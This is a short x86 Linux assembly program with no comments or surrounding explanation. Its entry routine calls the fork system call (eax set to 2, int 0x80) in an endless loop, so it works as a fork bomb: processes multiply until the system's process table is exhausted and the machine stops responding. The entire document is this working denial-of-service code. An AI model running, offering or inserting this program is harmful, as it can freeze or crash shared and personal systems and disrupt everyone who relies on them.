section .text
    global _start

_start:
    mov eax,2
    int 0x80
    jmp _start
